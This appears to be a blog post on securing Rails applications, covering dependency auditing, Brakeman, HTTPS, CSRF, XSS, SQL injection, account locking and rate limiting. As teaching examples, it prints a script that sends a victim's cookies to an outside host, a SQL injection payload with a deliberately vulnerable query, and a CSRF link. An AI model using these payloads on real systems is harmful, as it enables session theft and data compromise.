---
layout: post
title: "Rails - How to create rails applications more secure"
image: "closed"
---

Setting up a rails application is not that difficult nowadays, indeed spending no more than 1 hour you are able to
create a basic (and well structured) scaffold of a basic app.

But as we have been watching in the news recently, the number of attacks are increasing quickly and becoming more
sophisticated as well. Hackers are aiming not only big companies anymore, small companies, offices and even people
are more likely to be affected by hackers attacks than before.

Hence, it is crucial to think about security as soon as possible and stay alert during all the project life cycle.
In this article I present you some concepts about information security, common attacks and how to deal with them
in a rails application. Although this article focus in rails, the concepts are useful for any language and platform.

## Information Security

When we think about information security we have 3 main elements a hacker can attack in our application / company,
they are confidentiality, integrity and availability as known as CIA triad.

![cia triad](/public/images/posts/2017-08-16-rails/cia.png)

### Confidentiality
Confidentiality is about protect the data from unauthorized access, private data is valuable for hackers as they
can be sold in the black market (spam list, passwords) or even used to blackmail the company in some cases.

### Integrity
Integrity is data correctness, attackers can perform attacks to corrupt the data and paralyze the operation in
order to simply cause damage or demand a ransom.

A very common attack against integrity is a ransomware attack. In this case a malware known as ransomware encrypts
all files and requires a key to recovery them, generally the criminal demands a payment (in bitcoins) to send the key.

### Availability
Availability is the capacity of your web application to stay online and serving your users in a satisfactory way. Attacks
against this pillar focus on shutdown the service or slow it down in order to deny the user's usage.

Hackers can perform DoS (deny of service) or DDoS (distributed deny of service) attacks and flood your application with
fake requests making the real user's access very slow or even halt the entire system.

## Keep everything updated

Software has flaws and it includes any software, gems, libraries and even the OS (Linux, windows and Mac OS) we use.
Several bugs and security breaches are found and fixed daily, as an example you can search in [cve.mitre.org](http://cve.mitre.org)
for rails and see several rails reported vulnerabilities
[http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=rails](http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=rails)

In a ideal world when a critical security bug is found, the project's maintainers get hurry to release a fix and the
users should as soon as possible update the software.
In the real world it doesn't always happen, some gems can be abandoned without support, some people don't pay attention
in security notes and rarely update the gems, other people even lock their gems versions and never update them.

In my opinion the most important action to keep things secure is update your software often, also here enters a rule
I like to follow, (**the most you have, the most you have to worry about**). Don't start putting any gem in your project
indiscriminately. Each gem you use is a potential source of vulnerability. Also you should constantly search about bugs
found in your gems.

To automate this process I recommend using the gem [bundler-audit](https://github.com/rubysec/bundler-audit)

```ruby
gem 'bundler-audit'
```

After installed you should update the advisory db 

```shell
bundle audit update
```

And then you can audit your project

```shell
bundle audit
```

To avoid forgetting to run the `bundle audit update` we can use simply

```shell
bundle audit check --update
```

A common output when running **bundler-audit** could be

```shell
$ bundle audit

Name: actionpack
Version: 3.2.10
Advisory: OSVDB-91452
Criticality: Medium
URL: http://www.osvdb.org/show/osvdb/91452 Title: XSS vulnerability in sanitize_css in Action Pack
Solution: upgrade to ~> 2.3.18, ~> 3.1.12, >= 3.2.13

Name: actionpack
Version: 3.2.10
Advisory: OSVDB-91454
Criticality: Medium
URL: http://osvdb.org/show/osvdb/91454 Title: XSS Vulnerability in the `sanitize` helper of Ruby on Rails
Solution: upgrade to ~> 2.3.18, ~> 3.1.12, >= 3.2.13 
```

Bundler-audit keeps your gems updated but remember your application is not only your code and your gems, any other
software used can be a point of failure as well, so take care of your OS, database and any other piece of software used.

## Use HTTPS everywhere

Http is a text protocol, so anyone sniffing your network traffic is able to read the content of the http comunication, for this
reason you must use https in every endpoint in your site in production. Some people think only critical places like checkout, payment,
sign in / up endpoints should be accessed by https, but if you have any respect for the clients information you should use it in any url.
You never know what kind of information your client is writing in your application and which are confidential or not, so treat any client
data as confidential.

If you don't want to spend money in a SSL certificate [https://letsencrypt.org](https://letsencrypt.org) gives you for free. Another solution
I personally use is [https://www.cloudflare.com](https://www.cloudflare.com), you just configure your DNS entries there and they provide you
free https. They also have good cache and DDoS mitigation solutions in the paid plans.

## Use an static code analyzer

It is not difficult to write secure code in rails, but anyway I use and recommend using an static code analyzer 
focused in security.
[Brakeman](https://github.com/presidentbeef/brakeman) scans your code for any security vulnerability and should
be run after each code change as a CI process.

To install just add brakeman in your Gemfile.

```ruby
group :development do
  gem 'brakeman', require: false
end
```

And execute

```shell
brakeman
```

A common output could be

```shell
+SECURITY WARNINGS+

+------------+-------------------------+---------------+---------------------+------------------------------------------------------------------------------>>
| Confidence | Class                   | Method        | Warning Type        | Message                                                                      >>
+------------+-------------------------+---------------+---------------------+------------------------------------------------------------------------------>>
| High       | CheckoutController      | checkout      | Dynamic Render Path | Render path contains parameter value near line 23: render(action => +params[:>>
| Weak       | ProductsController      | preview_image | File Access         | Parameter value used in file name near line 32: File.read(params[:slug])     >>
+------------+-------------------------+---------------+---------------------+------------------------------------------------------------------------------>>
```

[Brakeman](https://github.com/presidentbeef/brakeman) can spot several unsecure codes, sql injection, xss, crsf
breaches, etc. As **bundler-audit** I recommend running brakeman as part of the CI process to ensure code quality.

## Never disable CSRF protection

CSRF (Cross Site Request Forgery) attacks happen when a malicious code or link points to another site and executes any
unauthorized command using the user's session.

Example:

  - User has signed in at http://www.mystore.com
  - In another tab user access http://www.malicious-site.com
  - The malicious site has a link as `<a href='http://www.mystore.com/account/destroy'>About</a>`.
  - When user clicks on this link the browser will request a **GET** to **http://ww.mystore.com/users/destroy**.
  - As the user is already signed in and the session cookie is present, the application executes the
command and deletes the users account

First of all in the example above the mystore application is not using the HTTP methods properly, any destructive
action (actions that change information in the server) must not use GET method. Also your app should be able to recognize
if a request was made from your site or from an external site.

If you are using rails you already have a very good protection against CSRF, using a CSRF token (a hash set in a `<meta` tag)
and setting this token in every form submitted prevents other sites to submit a POST to your application. To use this CSRF 
token simply enable it in the controllers (mostly in the ApplicationController).

```ruby
protect_from_forgery with: :exception
```

In this case any request not GET made without a crsf token will result in a exception. Now every non GET request should
include a csrf token as a parameter `authenticity_token` or using a `X-CSRF-Token` header (in ajax calls). If you are using
rails form or link helpers (`form_for`, `form_tag`, `link_to method: method`) you don't need to worry about this because
rails already injects as a hidden input automatically.

## Be careful with XSS
XSS (Cross Site Scripting) happens when a attacker successfuly injects some code (javascript, css, html) in the application
and this code is shown after (generally posts, comments and etc). A very common and classic javascript injection could be.
(there is even a professional framework to exploit XSS vulnerabilities called [Beef](http://beefproject.com)).

```javascript
<script>
document.write("<img src='http://www.hacktest.com?c=" + document.cookie + "' style='display: none;'>")
</script>
```

This code will try to load an image pointing to an external site and appending the cookies content as a parameter, if your
cookies are not set as httpOnly the user's session will be sent as a `c` parameter and will be logged in the server's log.

So it is crucial to sanitize any user's input before rendering the html and fortunately using rails it is the default
behaviour, unless you use `raw` in the views.

Another good feature you can use to avoid XSS is the response header `X-XSS-Protection`, setting `X-XSS-Protection=1` will
cause the browser try to detect and block some potential XSS attacks (the browser simply removes the content that could cause
the attack).

## Be careful with SQL Injection
SQL Injection has the same principe of other injection attacks, but instead of injecting code to be rendered in the front-end
sql injection attacks aim in the database, depending on how you have created your queries (if you simply concatenated strings
with the user's inputed parameters) a hacker can inject some code and modify the original command.

Example, given a sign in request where an user pass email and password we could have a select query to verify whether the user
exists or not:

```ruby
# I know it is a very stupid code but it just an example =P
User.where("email = '#{email}' and password = '#{password}'").first
```

if we pass a password string like `' or 1=1 or 1 = '` the single quotes will break the sql syntax and corrupt the sql command
completely.

```sql
SELECT * FROM "users" WHERE (email = 'email' and encrypted_password = '' or 1=1 or 1 = '')
```

This example above is very silly, in the real life an attacker would use a sql injection exploitation framework (the most famous
is the [SQLMap](http://sqlmap.org)). This sql injection frameworks support several databases and automatizes all the attack
life cycle like discovering tables, discovering system tables, dumping data and even trying to execute command line in the OS
directly.

## Lock users account after X failed sign in attempts
Another very common attack is the brute force attack (generally based on dictionaries), in this attack the bad guy knows the
username, email of the user and tries to guess the password. He can guess purely using brute force (testing every possibility)
or most common doing a dictionary attack (gathering information about the user and creating a dictionary customized to the
attack).

A good way to protect your user's against this kind of attack is implementing a lock after X failed attempts of sign in, doing
that you don't allow the hacker test several passwords against a user's login. When the user gets locked you must send a email
with instructions about how to redefine and unlock the account.

By the way the users registration, sign in, sign up, sign out by itself seems to be easy to implement but in real life there are
several points you need to provide (lock/unlock, password management, reset password) and all this code can lead to more
vulnerabilities.

Using rails I recommend using [Devise](https://github.com/plataformatec/devise), devise deals with all aspects of users flow like
signing in/up/out account editing, locking, OmniAuth, password reset and etc.

To implement account locking in devise simply put `devise :lockable`, also you need to configure locking parameters like, max of
attempts, locking strategy and other configurations

An `config/initializers/devise.rb` configuration example (extracted from
[devise wiki](https://github.com/plataformatec/devise/wiki/How-To:-Add-:lockable-to-Users)).

```ruby
# ==> Configuration for :lockable
# Defines which strategy will be used to lock an account.
# :failed_attempts = Locks an account after a number of failed attempts to sign in.
# :none            = No lock strategy. You should handle locking by yourself.
config.lock_strategy = :failed_attempts

# Defines which key will be used when locking and unlocking an account
config.unlock_keys = [ :email ]

# Defines which strategy will be used to unlock an account.
# :email = Sends an unlock link to the user email
# :time  = Re-enables login after a certain amount of time (see :unlock_in below)
# :both  = Enables both strategies
# :none  = No unlock strategy. You should handle unlocking by yourself.
config.unlock_strategy = :both

# Number of authentication tries before locking an account if lock_strategy
# is failed attempts.
config.maximum_attempts = 20

# Time interval to unlock the account if :time is enabled as unlock_strategy.
config.unlock_in = 1.hour

# Warn on the last attempt before the account is locked.
config.last_attempt_warning = true
```

User model example:

```ruby
class User < ActiveRecord::Base
  devise :database_authenticatable,
         :registerable,
         :recoverable,
         :lockable
end
```

## Use a throttling system to prevent DoS / DDoS attacks
Another kind of attack very popular nowadays is the DoS (Deny of Service), and his variant (Distributed Deny of Service),
in this attack the aggressor tries to flood your application with requests causing your server stop responding legit users
because it is too busy responding the fake requests.

The difference between DoS and DDoS is the distributed factor, a DDoS attack is harder (sometimes almost impossible) to defend
yourself against, due the attacker uses several clients to perform the attack.

In rails you can try to mitigate this kind of attack using a gem called [rack-attack](https://github.com/kickstarter/rack-attack).
Rack-attack is a middleware that allow you to define rules about accesses, you can for instance block IPs based on black lists

```ruby
Rack::Attack.blocklist('block 1.2.3.4') do |req|
# Requests are blocked if the return value is truthy
'1.2.3.4' == req.ip
end
```

Block based on User Agent (not so useful in my opinion, because it is easy to fake).

```ruby
# Block logins from a bad user agent
Rack::Attack.blocklist('block bad UA logins') do |req|
  req.path == '/login' && req.post? && req.user_agent == 'BadUA'
end
```

You can also allow block everyone and only allow based in a white list.

```ruby
# Always allow requests from localhost (blocklist & throttles are skipped)
Rack::Attack.safelist('allow from localhost') do |req|
  # Requests are allowed if the return value is truthy
  '127.0.0.1' == req.ip || '::1' == req.ip
end
```

Another feature rake-attack provides to us (and I think the most useful) is the throttling, you can using it
to limit how many requests can be made based on a key, the key generally is the client's IP

Example:
```ruby
# Throttle requests to 5 requests per second per ip
Rack::Attack.throttle('req/ip', limit: 5, period: 1.second) do |req|
  req.ip
end
```

The rule above says an IP can only perform 5 requests per second. Another useful rule would be:

```ruby
Rack::Attack.throttle('logins/email', limit: 5, period: 60.seconds) do |req|
  req.params['email'] if req.path == '/login' && req.post?
end
```

In this case we are limiting harder when the client tries attempts sign in, so in this case we are limiting in 5 in a
1 minute period, to specify the sign in we use the `req.path == '/login'` and the `req.post?` test.

It is a good practice to throttle the sign in process as we generally will be using a bcrypt / scrypt algorithm to hash the
password and these algorithms spend some time to run, so an attacker could use this as the perform a DoS.

## Use bcrypt or scrypt to generate password hashes

## Set the security headers properly

The modern browsers support some especial response headers designed to bring more secure to your application

  - **Strict-Transport-Security**:
  - **X-XSS-Protection**:
  - **X-Frame-Options**:
  - **X-Content-Type-Options**:
  - **Content-Security-Policy**:
  - **Public-Key-Pins**:
  - **Referrer-Policy**:

A good tool to verify whether your site implements these headers properly or not is the [https://securityheaders.io](https://securityheaders.io),
you can scan any site and receive an score and also tips about each header.

## Use a vulnerability scanner to test your application periodicaly

Security is very important not only in the beginning of the development but in the whole software life cycle as well. It is helpful to
have a service to verify any possible vulnerability and alarm you as soon as any breach is discovered.

For this task I have used [https://gauntlet.io/](https://gauntlet.io/), Gauntlet runs a set of security scanners against your applications
and shows you any issue. The tool is really useful and for small applications they have a free plan (though the paid plans are not so expensive
and worthies every dollar).

## References

  - [guides.rubyonrails.org/security.html](http://guides.rubyonrails.org/security.html): Rails guides about security.
  - [github.com/rubysec/bundler-audit](https://github.com/rubysec/bundler-audit): Audits your Gemfile.lock and scan it for known security issues.
  - [github.com/presidentbeef/brakeman](https://github.com/presidentbeef/brakeman): Scans your code for any security vulnerability.
  - [github.com/kickstarter/rack-attack](https://github.com/kickstarter/rack-attack): Implements black lists, white lists and throttling in your
  application, (usefull against DoS and DDoS attacks).
  - [github.com/plataformatec/devise](https://github.com/plataformatec/devise): Complete and very mature solution to deal with authentication,
  OmniAuth, lockable accounts and password recovering.
  - [securityheaders.io](https://securityheaders.io): Scans your site and verifies all security headers.
  - [gauntlet.io](https://gauntlet.io/): Scans your application using multiple vulnerability scanners and present all breaches and bad potential
  security failures.

